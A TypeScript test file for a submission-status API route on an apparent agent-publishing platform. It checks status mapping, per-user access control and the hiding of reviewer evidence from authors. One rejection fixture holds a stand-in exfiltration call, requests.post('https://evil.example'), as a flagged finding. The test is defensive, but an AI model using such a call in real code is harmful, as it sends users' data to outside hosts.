/**
 * A Condor publish's status (contract §5.3). The risks: showing someone else's
 * submission, leaking the reviewer's evidence to the author, and a published
 * submission with no listing_id for Condor to address.
 */

import { NextRequest } from "next/server"
import { describe, it, expect, vi, beforeEach } from "vitest"

const versionFindUnique = vi.fn()
const tokenFindUnique = vi.fn()

vi.mock("@/botcamp/lib/prisma", () => ({
  prisma: {
    apiToken: { findUnique: (...a: unknown[]) => tokenFindUnique(...a), update: vi.fn() },
    agentVersion: { findUnique: (...a: unknown[]) => versionFindUnique(...a) },
  },
}))
vi.mock("@/botcamp/lib/auth", () => ({ auth: async () => null }))

const { GET } = await import("./route")

const get = (auth: string | null = "bc_token") =>
  GET(new NextRequest("http://localhost/api/submissions/ver_1", { headers: auth ? { authorization: `Bearer ${auth}` } : {} }), {
    params: Promise.resolve({ id: "ver_1" }),
  })

const version = (overrides: Record<string, unknown> = {}) => ({
  id: "ver_1",
  status: "PENDING",
  createdAt: new Date("2026-10-23T12:00:00.500Z"),
  reviewedAt: null,
  reviewNote: null,
  aiReview: null,
  uploadedById: "author",
  strategy: { slug: "grid-bot" },
  ...overrides,
})

const as = (id: string, role = "STUDENT") =>
  tokenFindUnique.mockResolvedValue({ id: "tok", scopes: ["agents:read", "agents:publish"], expiresAt: null, user: { id, role, isMember: true } })

beforeEach(() => {
  vi.clearAllMocks()
  as("author")
  versionFindUnique.mockResolvedValue(version())
})

describe("GET /api/submissions/[id]", () => {
  it("reads as pending until both reviews are done", async () => {
    expect(await (await get()).json()).toEqual({ submission_id: "ver_1", status: "pending", submitted_at: "2026-10-23T12:00:00Z" })
    versionFindUnique.mockResolvedValue(version({ status: "NEEDS_REVIEW", reviewedAt: new Date() }))
    expect((await (await get()).json()).status).toBe("pending")
  })

  it("gives a published one its listing_id, the page slug", async () => {
    versionFindUnique.mockResolvedValue(version({ status: "APPROVED", reviewedAt: new Date("2026-10-23T14:40:00Z") }))
    expect(await (await get()).json()).toEqual({
      submission_id: "ver_1",
      status: "published",
      submitted_at: "2026-10-23T12:00:00Z",
      decided_at: "2026-10-23T14:40:00Z",
      listing_id: "grid-bot",
    })
  })

  it("explains a rejection with the author feedback and the admin's note, not the evidence", async () => {
    versionFindUnique.mockResolvedValue(
      version({
        status: "REJECTED",
        reviewedAt: new Date("2026-10-23T14:40:00Z"),
        reviewNote: "Declare the connector you trade on.",
        aiReview: {
          decision: "reject",
          findings: [{ evidence: "requests.post('https://evil.example')", explanation: "exfiltration" }],
          authorFeedback: [{ path: "routines/r.py", category: "exfiltration", message: "Don't send data to third-party hosts." }],
        },
      }),
    )
    const body = await (await get()).json()
    expect(body.reasons).toEqual([
      { rule: "human-review", detail: "routines/r.py: Don't send data to third-party hosts." },
      { rule: "human-review", detail: "Declare the connector you trade on." },
    ])
    expect(JSON.stringify(body)).not.toContain("evil.example")
  })

  it("is only its uploader's to read", async () => {
    as("someone-else")
    expect((await get()).status).toBe(403)
  })

  // Security review 2026-11 (L9): a token never carries its owner's admin role.
  it("doesn't let an admin's token read someone else's submission", async () => {
    as("admin", "ADMIN")
    expect((await get()).status).toBe(403)
  })

  it("401s without a token and 404s an unknown id", async () => {
    expect((await get(null)).status).toBe(401)
    versionFindUnique.mockResolvedValue(null)
    expect((await get()).status).toBe(404)
  })
})
